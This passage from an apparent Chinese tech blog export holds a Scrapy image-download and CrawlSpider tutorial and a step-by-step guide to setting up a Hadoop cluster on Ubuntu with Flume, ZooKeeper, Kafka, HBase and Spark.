图片存放目录\nIMAGES_STORE = './imgs'\n\n```\n\nitems.py增加字段\n\n```python\nimport scrapy\n\n\nclass ImgdownloadItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    img_url = scrapy.Field()\n    page = scrapy.Field()\n```\n\npipelines.py增加管道类\n```python\nimport scrapy\nfrom itemadapter import ItemAdapter\n\n# 默认管道类无法请求图片数据\nclass ImgdownloadPipeline:\n    def process_item(self, item, spider):\n        return item\n\n\n# 接受图片地址和title,然后对其进行请求存储到本地\n# 提供了数据下载功能,也可以下载视频和音频\nfrom scrapy.pipelines.images import ImagesPipeline\n\n\n# 继承ImagesPipeline类\nclass img_download(ImagesPipeline):\n    # 重写三个父类方法\n    def get_media_requests(self, item, info):\n        # 下载,并传参,如果传递整个item,最后只会下载一张图片,原因未知\n        yield scrapy.Request(url=item['img_url'], meta={'title': item['title'], 'page': item['page']})\n\n    # 返回图片保存路径\n    def file_path(self, request, response=None, info=None, *, item=None):\n        # 拼接路径\n        title = request.meta['title']\n        page = request.meta['page']\n        path = f'{title}/{page}.jpg'\n\n        # 返回路径\n        return path\n\n    # 将item返回给下一个即将被执行的管道类\n    def item_completed(self, results, item, info):\n        return item\n```\n\nsetting.py增加管道类\n```python\nITEM_PIPELINES = {\n   #'imgdownload.pipelines.ImgdownloadPipeline': 300,\n   'imgdownload.pipelines.img_download': 300,\n}\n```\n\n运行效果\n\n![1](img_3.png)\n\n## CrawlSpider 深度爬取\n是什么\n\n    是Spider的一个子类,也就是爬虫文件的父类\n    \n作用:用作于全站数据的爬取\n    \n    将一个页面下所有的页码进行爬取\n\n基本使用\n    \n    1.创建一个工程\n    2.创建一个基于CrawlSpider类的爬虫文件\n        crapy genspider -t crawl main www.xxx.com\n    3.执行工程\n\n编写工程文件main.py\n```python\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\n\n\nclass MainSpider(CrawlSpider):\n    name = 'main'\n    #allowed_domains = ['https://www.mn52.com/']\n    start_urls = ['https://www.mn52.com/fj/']\n\n    # 链接提取器,根据allow里的正则来提取url\n    rules = (\n        # 对提取的url发起请求,然后回调解析\n        # 如果allow为空 将抓取此页面下的链接\n        Rule(LinkExtractor(allow=r'list_8_\\d.html'), callback='parse_item', follow=True),\n    )\n\n    def parse_item(self, response):\n        print(response)\n        item = {}\n        return item\n\n```\n执行工程\n    \n    可以看到抓取了所有页码的url\n```bash\nchenci@MacBook-Pro crawl %scrapy crawl main\n<200 https://www.mn52.com/fj/list_8_2.html>\n<200 https://www.mn52.com/fj/list_8_3.html>\n<200 https://www.mn52.com/fj/list_8_4.html>\n<200 https://www.mn52.com/fj/list_8_8.html>\n<200 https://www.mn52.com/fj/list_8_5.html>\n<200 https://www.mn52.com/fj/list_8_7.html>\n<200 https://www.mn52.com/fj/list_8_9.html>\n<200 https://www.mn52.com/fj/list_8_6.html>\n```\n\n\n","tags":["教程","爬虫","scrapy"],"categories":["爬虫"]},{"title":"ubuntu下hadoop集群搭建","url":"/2022/03/01/ubuntu下hadoop集群搭建/","content":"### 一.配置ip(三个节点)\n自ubuntu17之后多了一种配置方式更加高效,也就是netplan\n\n1.1编辑配置文件\n```bash\nroot@master:/etc/netplan# gedit /etc/netplan/01-network-manager-all.yaml\n```\n配置内容如下,`注意缩进`\n```yaml\nnetwork:\n version: 2\n renderer: NetworkManager\n ethernets:\n    ens33:\n      dhcp4: no\n      dhcp6: no\n      addresses: [192.168.10.101/24]\n      gateway4: 192.168.10.1\n      nameservers:\n        addresses: [8.8.8.8, 192.168.10.1]\n```\n1.2使配置生效\n```bash\nroot@master:/etc/netplan# netplan apply\n```\n如果没有报错则配置成功\n\n### 二.配置主机名和主机名映射(三个节点)\n1.1配置主机名并查看\n```bash\n重启后生效\nroot@master:/etc/netplan# hostnamectl set-hostname master\nroot@master:/etc/netplan# hostname\n```\n1.2配置主机名映射\n```bash\nroot@master:/etc/netplan# gedit /etc/hosts\n```\n添加以下内容\n```bash\n192.168.10.101 master\n192.168.10.102 slave1\n192.168.10.103 slave2\n```\n1.3ping测试\n```bash\n有以下回显证明配置成功\nroot@master:/etc/netplan# ping slave2\nPING slave2 (192.168.10.103) 56(84) bytes of data.\n64 bytes from slave2 (192.168.10.103): icmp_seq=1 ttl=64 time=0.891 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=2 ttl=64 time=0.369 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=3 ttl=64 time=0.455 ms\n```\n1.4将hosts文件分发给子节点\n```bash\nroot@master:/etc/netplan# scp /etc/hosts root@slave1:/etc/\n输入yes再输入密码\n```\n\n### 三.配置ssh免密登录(三个节点)\n因为Ubuntu并不自带ssh服务所以要安装ssh并配置允许root远程登录\n```bash\n下载\nsudo apt-get install openssh-server\n启动\nsudo service ssh start\n配置\nsudo vim /etc/ssh/sshd_config\n添加一条\nPermitRootLogin yes\n```\n1.生成密钥\n```bash\nroot@master:~# ssh-keygen -t rsa\n一直回车\n```\n2.将密钥写入authorized.keys文件\n```bash\nroot@master:~# cd .ssh/\nroot@master:~/.ssh# cat id_rsa.pub >> authorized_keys\n\n```\n3.在另外两个子节点执行以上操作,并将authorized.keys的内容复制进master主机的authorized.keys文件末尾,成功后如下\n```bash\nroot@master:~/.ssh# cat authorized.keys \nssh-dss AAAAB3NzaC1kc3MAAACBAIzJrAXCuK15C+mq3TkdFFJUJiuY9rMo6L6LoU+naCEKJNKfRDXXAXDcRC2TJK5JqnWHuexfOusYZS/kpRU4JO1S4VGzq446r5QM19c7xH3TkE2A2W2Z9AA/7G+UHzqyHWQ6gDRIsqqsF6MlJUtOO7x3XtNUVYrtIzvUeqTbXrbJAAAAFQCsjTDCWxn2PU5WobBN/xYTxS9vdwAAAIBcM2X2tlkwnmpNcm3a1Cf4addU395AfJfhOwdqacHSCdiaNSlx7kVkd8T1Hk+gvF0KzP4KbjqiGWsGEiaYdlU4Ujrei+VplG8moa4GcCA/wUzpAioeULCP+0+870/+NwFUt7XKhYk9llUrh56LWev5c5YC3aNQ0GzElBxjUj8v4gAAAIBpUWTTkmdeL7ploxSCR56Js0pMFJiGvKP6tMkc3UL5Vwl5RDqJt+eFd31SDVJVVEK3vX06wujOlDbHwdIfpE48y2dN7nRn5bK3ccg1yo7Cq7Vtj4TlODYTkPYxXaR2e8dqW9bg8anXvaCI7AylRwPYNnQIgcjPeC4qJsRuMq4Mag== root@master\nssh-dss AAAAB3NzaC1kc3MAAACBAMxF+Q5Kg1DluBqo0vZKPlE0uB2+1cDTn/f2xN0ug5mYa3WDpC36p8P2iQ4IrZEp7BqFEiQSstbZd+Im4qpaBRlHnWZhym5oOqY2a4JVsrAtyTObYFM/+/eEtQ/0Bl6UxeRKkWWPuZwbtYREEnbJ2VwLzvIJEBDVkZcccY58TO8LAAAAFQC41GJzzSEGbZLDCu2Fgzo3iml/ZQAAAIBpWqD1HHm5gTyp/6h+hCEDMP1cOOl11e+f4ZO+vhpYm+AXqpEbmMr2UTSBlc93PdJRxiIAIKidWmcLaaSuLDYWoeDDcFGCclz9bCoXZmeOVoAe096jyNFPZGorb7mqnif3oRI5hkqsmph2AX/9n90taaLUF5VrgJVEAOPLkjZ+IAAAAIEAsc7MCMYn7phJIACMypSeeWkmjUisRxVEp6u6WWHQ3GsImNkjR7UmFVxnpYOikexsPsbhlXahTIas7SQiPNRsgxi2nDBwauEvkRHQID5LbjFiIp97xbrSg8T0H23MXlBbI/MycFcyuxBIUOL5zSrz8CcUG6uQtLDMGAEVkCHORCU= root@slave1\nssh-dss AAAAB3NzaC1kc3MAAACBANwhno/+fLpWNOg1NOrBQ+qs7XWLZeu+Xxl/g5eJOD9+qaQKTWLOYfgyez38cpqjZ9r39tKRR5HQ7RVlM0tJicGgz+jCdtRoQKs6W5mc3SCmW+u+ILMxxTqdUHUKsNq4NauoVcSduq4ot8HKpi2GBGWE1MCNgCaSnH6TB8tvl49lAAAAFQCnfx5p+/KbSsrlSFo9BYuAhEuI7QAAAIA4lsxJjI3bn/FQsSjzcjIyRLiut432/i/QngE7Y9UwQGXKY9x8z7EksXDpdswo2M2cBSZsrelSnoiUYHjusSfMTptzdT8WUWCutCd7Kn1zU4fPJCM4gTNuECjHaWU/t7BVJXHGkB6eWErcHxnm6iILVLCFf9wm8oPMjRJmLLQGhQAAAIEAkA+YrcoTQfuZbS8ACHN3zkvg1/gAmx26owiZsMrSaV1rbrJ6WgWCX+Ux9CHIkKK4MZrJrXVQpoal5/PEPw0OCZepCHOGVLNcrhyhKNov1EzSC664Mb0l+9bHh+zXjv/X0yrMB1bY16eNMBCnx0YsJ5vuXZtZRg9ms6dEh5eA/LY= root@slave2\n```\n4.分发给另外两台子节点\n```bash\nroot@master:~/.ssh# scp ./authorized.keys root@slave1:/root/.ssh/\nroot@master:~/.ssh# scp ./authorized.keys root@slave2:/root/.ssh/\n```\n5.测试免密登录\n```bash\nssh master\nssh slave1\nssh slave2\n```\n### 四.安装jdk\n1.解压\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# tar -zxvf jdk-8u11-linux-x64.tar.gz\n```\n2.分发给其余子节点\n```bash\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave1:/root/software/jdk/\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave2:/root/software/jdk/\n```\n3.配置环境变量\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# gedit /root/.bashrc \n```\n配置如下\n```bash\n#JAVA_HOME\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\nexport PATH=$JAVA_HOME/bin:$PATH\n```\n分发给其他节点,也可以直接配置\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave2:/root/\n```\n4.刷新环境变量\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# source /root/.bashrc \n```\n5.测试\n如下回显则表示成功\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# java -version\njava version \"1.8.0_11\"\nJava(TM) SE Runtime Environment (build 1.8.0_11-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.11-b03, mixed mode)\n```\n### 五.安装hadoop\n1.解压\n```bash\nroot@master:~/software/hadoop# tar -zxvf hadoop-2.7.3.tar.gz\n```\n2.配置环境变量\n```bash\nroot@master:~/software/hadoop# gedit /root/.bashrc \n```\n配置如下\n```bash\n#HADOOP_HOME\nexport HADOOP_HOME=/root/software/hadoop/hadoop-2.7.3\nexport PATH=$HADOOP_HOME/bin:$HADOOP/sbin:$PATH\n```\n分发给子节点\n```bash\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave2:/root/\n```\n刷新环境变量\n```bash\nroot@master:~/software/hadoop# source /root/.bashrc \n```\n3.创建hadoopdata目录\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3# mkdir hadoopdata\n```\n4.配置hadoop-env.sh文件\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cd etc/hadoop/\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hadoop-env.sh \n```\n```bash\n找到\nexport JAVA_HOME=${JAVA_HOME}\n修改为\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n5.配置yarn-env.sh\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-env.sh \n```\n```bash\n找到\n#export JAVA_HOME=/home/y/libexec/jdk1.6.0/\n修改为\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n6.配置核心组件core-site.xml \n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit core-site.xml \n```\n```xml\n<configuration>\n<property>\n<name>fs.defaultFS</name>\n<value>hdfs://master:9000</value>\n</property>\n<property>\n<name>hadoop.tmp.dir</name>\n<value>/root/software/hadoop/hadoop-2.7.3/hadoopdata</value>\n</property>\n</configuration>\n```\n7.配置配置文件系统hdfs-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hdfs-site.xml \n```\n```xml\n<configuration>\n\t<property>\n\t\t<name>dfs.replication</name>\n\t\t<value>2</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.namenode.rpc-address</name>\n\t\t<value>master:50071</value>\n\t</property>\n</configuration>\n```\n8.配置文件系统yarn-site.xm\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-site.xml\n```\n```xml\n<configuration>\n<property>\n\t\t<name>yarn.nodemanager.aux-services</name>\n\t\t<value>mapreduce_shuffle</value>\n\t</property>\n\t<property>\n                <name>yarn.resourcemanager.address</name>\n                <value>master:18040</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.scheduler.address</name>\n                <value>master:18030</value>\n        </property>\n\t<property>\n                <name>yarn.resourcemanager.resource-tracker.address</name>\n                <value>master:18025</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.admin.address</name>\n                <value>master:18141</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.webapp.address</name>\n                <value>master:18088</value>\n        </property>\n\n</configuration>\n```\n9.配置计算框架mapred-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cp mapred-site.xml.template mapred-site.xml\n\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit mapred-site.xml\n```\n```xml\n<configuration>\n<property>\n<name>mapreduce.framework.name</name>\n<value>yarn</value>\n</property>\n</configuration>\n```\n10.配置slaves文件\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit slaves \n```\n```bash\nmaster\nslave1\nslave2\n```\n11.分发给子节点\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# scp -r /root/software/hadoop/hadoop-2.7.3/ root@slave2:/root/software/hadoop/\n```\n12.格式化namanode\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# hdfs namenode -format\n```\n13.启动hadoop\n```bash\n进入sbin目录下执行\n\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# ./start-all.sh \n\n执行命令后，提示出入yes/no时，输入yes。\n```\n14.测试\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n```\n有以下进程表示搭建成功!\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n4848 SecondaryNameNode\n4999 ResourceManager\n4489 NameNode\n4650 DataNode\n5423 Jps\n5135 NodeManager\n```\n15.web端查看\n```bash\n在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:50070/,有如下回显表示成功\n```\n\n![1](QQ20220301-220428.png)\n```bash\n在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:18088/，检查 Yarn是否正常，页面如下图所示。\n```\n![2](QQ20220301-220440.png)\n### 六.flume安装与配置\n\n1.解压\n```bash\ntar -zxvf apache-flume-1.7.0-bin.tar.gz \n```\n2.配置环境变量\n```bash\n#FLUME_HOME\nexport FLUME_HOME=/root/software/flume-1.7.0\nexport PATH=$FLUME_HOME/bin:$PATH\n```\n3.复制配置文件\n```bash\ncp flume-env.sh.template flume-env.sh\n```\n修改\n```bash\n# export JAVA_HOME=/usr/lib/jvm/java-6-sun\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n4.配置配置文件\n```bash\nsource: 数据的入口,规定了数据收集的入口规范\nchannel: 管道,存储数据用的\nskin: 数据的出口,规定了数据收集的出口规范\nagent: 一个任务,包含了source,channel,skin\n\n```\n\n```bash\ncp flume-conf.properties.template flume-conf.properties\n```\n修改为\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n# Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n5.启动\n```bash\n./bin/flume-ng agent --conf conf --conf-file conf/flume-conf.properties --name a1 -Dflume.root.logger=INFO,console\n```\n6.nc测试\n```bash\nnc localhost 44444\n```\n7.案例一\n监听文件内容变动，将新增加的内容输出到控制台。\n新建配置文件 exec-memory-logger.properties,其内容如下：\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#配置sources属性\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\n\n#将sources与channels进行绑定\na1.sources.s1.channels = c1\n   \n#配置sink \na1.sinks.k1.type = logger\n\n#将sinks与channels进行绑定  \na1.sinks.k1.channel = c1  \n   \n#配置channel类型\na1.channels.c1.type = memory\n```\n8.案例二\n监听指定端口,将这个向这个端口写入的数据输出到控制台\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = 192.168.32.130\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transctionCapacity = 100\n\n#Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n9.案例三\n监听指定目录，将目录下新增加的文件存储到 HDFS。\n新建配置文件spooling-memory-hdfs.properties\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#配置sources属性\na1.sources.s1.type =spooldir  \na1.sources.s1.spoolDir =/tmp/logs\na1.sources.s1.basenameHeader = true\na1.sources.s1.basenameHeaderKey = fileName \n#将sources与channels进行绑定  \na1.sources.s1.channels =c1 \n\n   \n#配置sink \na1.sinks.k1.type = hdfs\na1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/\na1.sinks.k1.hdfs.filePrefix = %{fileName}\n#生成的文件类型，默认是Sequencefile，可用DataStream，则为普通文本\na1.sinks.k1.hdfs.fileType = DataStream  \na1.sinks.k1.hdfs.useLocalTimeStamp = true\n#将sinks与channels进行绑定  \na1.sinks.k1.channel = c1\n   \n#配置channel类型\na1.channels.c1.type = memory\n```\n\n10.案例四\n将本服务器收集到的数据发送到另外一台服务器。\n新建配置 netcat-memory-avro.properties，监听文件内容变化，然后将新的文件内容通过 avro sink 发送到 hadoop001 这台服务器的 8888 端口：\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1\na1.sinks = k1\na1.channels = c1\n\n#配置sources属性\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\na1.sources.s1.channels = c1\n\n#配置sink\na1.sinks.k1.type = avro\na1.sinks.k1.hostname = hadoop001\na1.sinks.k1.port = 8888\na1.sinks.k1.batch-size = 1\na1.sinks.k1.channel = c1\n\n#配置channel类型\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n```\n配置日志聚合Flume\n使用 avro source 监听 hadoop001 服务器的 8888 端口，将获取到内容输出到控制台\n```bash\n#指定agent的sources,sinks,channels\na2.sources = s2\na2.sinks = k2\na2.channels = c2\n\n#配置sources属性\na2.sources.s2.type = avro\na2.sources.s2.bind = hadoop001\na2.sources.s2.port = 8888\n\n#将sources与channels进行绑定\na2.sources.s2.channels = c2\n\n#配置sink\na2.sinks.k2.type = logger\n\n#将sinks与channels进行绑定\na2.sinks.k2.channel = c2\n\n#配置channel类型\na2.channels.c2.type = memory\na2.channels.c2.capacity = 1000\na2.channels.c2.transactionCapacity = 100\n\n```\n这里建议先启动a2，原因是 avro.source 会先与端口进行绑定，这样 avro sink 连接时才不会报无法连接的异常。但是即使不按顺序启动也是没关系的，sink 会一直重试，直至建立好连接。\n\n### 七.Zookeeper安装配置\n1.解压并配置环境变量\n```bash\n#ZOOKEEPER_HOME\nexport ZOOKEEPER_HOME=/root/software/zookeeper-3.4.5-cdh5.6.0\nexport PATH=$ZOOKEEPER_HOME/bin:$PATH\n```\n\n2.新建一个目录用来存放数据\n```bash\nmkdir /root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n3.编辑配置文件\n复制一份配置文件,并替换内容\n```bash\ncp zoo_sample.cfg zoo.cfg\n```\n```bash\ndataDir=/root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n4.启动\n```bash\n ./zkServer.sh start\n```\n\n### 八.kafka安装配置与使用\n1.解压并配置环境变量\n```bash\n#KAFKA_HOME\nexport KAFKA_HOME=/root/software/kafka_2.11-2.0.0\nexport PATH=$KAFKA_HOME/bin:$PATH\n```\n2.创建日志文件夹\n```bash\nmkdir /root/software/kafka_2.11-2.0.0/kafka-logs\n```\n3.config文件夹中修改配置文件以下几项\n```bash\ngedit server.properties \n```\n```bash\nlog.dirs=/root/software/kafka_2.11-2.0.0/kafka-logs\n\nlisteners=PLAINTEXT://localhost:9092\n```\n4.启动kafka\n启动kafka之前要先启动zookeeper\n```bash\n kafka-server-start.sh ./config/server.properties\n```\n5.创建topic主题\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-demo --replication-factor 1 --partitions 1\n```\n6.查看\n```bash\n kafka-topics.sh --list --zookeeper localhost:2181\n```\n7.生产消息\n```bash\n kafka-console-producer.sh --broker-list localhost:9092 --topic topic-demo\n```\n8.消费消息\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-demo\n--beginning 可选参数,代表从头消费\n```\n9.查看所有topic的信息\n```bash\nkafka-topics.sh --zookeeper localhost: 2181 --describe \n--topic topic-demo 可选参数,表示指定topic\n```\n10.单节点多broker\n\n* 修改配合文件中的id,端口,日志文件夹\n* 启动\n```bash\nkafka-server-start.sh --deamon ./config/server.properties &\nkafka-server-start.sh --deamon ./config/server2.properties &\nkafka-server-start.sh --deamon ./config/server3.properties &\n```\n* 多副本\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic my-topic-demo --replication-factor 3 --partitions 1\n```\n\n### 九.安装scala\n1.解压并配置环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# tar -zxvf scala-2.11.0.tgz \nroot@ubuntu:~/software/scala-2.11.0# gedit /root/.bashrc \n```\n```bash\n#SCALA_HOME\nexport SCALA_HOME=/root/software/scala-2.11.0\nexport PATH=$SCALA_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.测试\n```bash\nroot@ubuntu:~/software/scala-2.11.0# scala\nWelcome to Scala version 2.11.0 (Java HotSpot(TM) 64-Bit Server VM, Java 1.8.0_11).\nType in expressions to have them evaluated.\nType :help for more information.\n\nscala> \n```\n\n### 十.安装maven\n1.解压并配置环境变量\n```bash\nroot@ubuntu:~/software# tar -zxvf apache-maven-3.8.5-bin.tar.gz\nroot@ubuntu:~/software# mv apache-maven-3.8.5 maven-3.8.5\nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#MAVEN_HOME\nexport MAVEN_HOME=/root/software/maven-3.8.5\nexport PATH=$MAVEN_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.测试\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mvn -v\nApache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)\nMaven home: /root/software/maven-3.8.5\nJava version: 1.8.0_11, vendor: Oracle Corporation, runtime: /root/software/jdk1.8.0_11/jre\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"linux\", version: \"5.4.0-100-generic\", arch: \"amd64\", family: \"unix\"\n```\n4.修改jar包存放位置\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mkdir maven-repos\nroot@ubuntu:~/software/maven-3.8.5# gedit conf/settings.xml \n```\n添加一行\n```xml\n<localRepository>/root/software/maven-3.8.5/maven-repos</localRepository>\n```\n\n### 十一.Hbase安装\n1.解压并配置环境变量\n```bash\nroot@master:~/software# tar -zxvf hbase-1.2.0-bin.tar.gz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#HBASE_HOME\nexport HBASE_HOME=/root/software/hbase-1.2.0\nexport PATH=$HBASE_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.编辑配置文件\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-env.sh\n```\n修改\n```bash\n#export JAVA_HOME=/usr/java/jdk1.6.0/\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n修改\n```bash\n# export HBASE_MANAGES_ZK=true\nexport HBASE_MANAGES_ZK=false\n```\n添加\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-site.xml \n```\n```xml\n<configuration>\n        <property>\n                <name>hbase.cluster.distributed</name>\n        </property>\n        <property>\n                <name>hbase.rootdir</name>\n                <value>hdfs://master:9000/hbase</value>\n        </property>\n        <property>\n                <name>hbase.zookeeper.quorum</name>\n                <value>master</value>\n        </property>\n        <property>\n                <name>hbase.master.info.port</name>\n                <value>60010</value>\n        </property>\n</configuration>\n```\n修改\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit regionservers \n```\n为\n```bash\nmaster\n```\n4.启动hbase\n首先要先启动zeekeeper\n```bash\nroot@master:~/software# zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... STARTED\n```\n```bash\nroot@master:~/software# start-hbase.sh \nstarting master, logging to /root/software/hbase-1.2.0/logs/hbase-root-master-master.out\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\nmaster: starting regionserver, logging to /root/software/hbase-1.2.0/bin/../logs/hbase-root-regionserver-master.out\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\n```\n```bash\nroot@master:~/software/hbase-1.2.0/bin# jps\n2992 SecondaryNameNode\n4514 QuorumPeerMain\n3282 NodeManager\n6196 HRegionServer\n3143 ResourceManager\n6026 HMaster\n6330 Jps\n2636 NameNode\n2796 DataNode\n```\n访问\n```url\nhttp://master:60010\n```\n\n6.测试\n```bash\nroot@master:~/software/hbase-1.2.0/bin# hbase shell\n\nhbase(main):001:0> version\n1.2.0, r25b281972df2f5b15c426c8963cbf77dd853a5ad, Thu Feb 18 23:01:49 CST 2016\n```\n\n### 十二.Spark安装\n1.解压并配置环境变量\n```bash\nroot@master:~/software# tar -zxvf spark-2.1.1-bin-hadoop2.7.tgz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#SPARK_HOME\nexport SPARK_HOME=/root/software/spark-2.1.1-bin-hadoop2.7\nexport PATH=$SPARK_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.测试\n```bash\nroot@master:~/software/spark-2.1.1-bin-hadoop2.7# spark-shell --version\nWelcome to\n      ____              __\n     / __/__  ___ _____/ /__\n    _\\ \\/ _ \\/ _ `/ __/  '_/\n   /___/ .__/\\_,_/_/ /_/\\_\\   version 2.1.1\n      /_/\n                        \nUsing Scala version 2.11.8, Java HotSpot(TM) 64-Bit Server VM, 1.8.0_11\nBranch \nCompiled by user jenkins on 2017-04-25T23:51:10Z\nRevision \nUrl \nType --help for more information.\n\n```\n### 十三.flume对接kafka\n一般flume采集的方式有两种\n1.Exec类型的Source\n可以将命令产生的输出作为源，如：\n```bashh\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt //此处输入命令\n```\n2.Spooling Directory类型的 Source\n将指定的文件加入到“自动搜集 ”目录中。flume会持续监听这个目录，把文件当做source来处理。注意：一旦文件被放到“自动收集”目录中后，便不能修改，如果修改，flume会报错。此外，也不能有重名的文件，如果有，flume也会报错。\n```bash\na1.sources.r1.type = spooldir\na1.sources.r1.spoolDir = /home/work/data\n```\n#### 1.flume采集某日志文件到kafka自定义topic\n1.1 创建flume配置文件 flume-kafka-file.conf\n```bash\n# 定义这个agent中各组件的名字\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# 描述和配置source组件：r1\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt\n \n# 描述和配置sink组件：k1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# 描述和配置channel组件，此处使用是内存缓存的方式\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# 描述和配置source  channel   sink之间的连接关系\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n1.2 启动zookeeper和kafka\n```bash\n./zkServer.sh start\nJMX enabled by 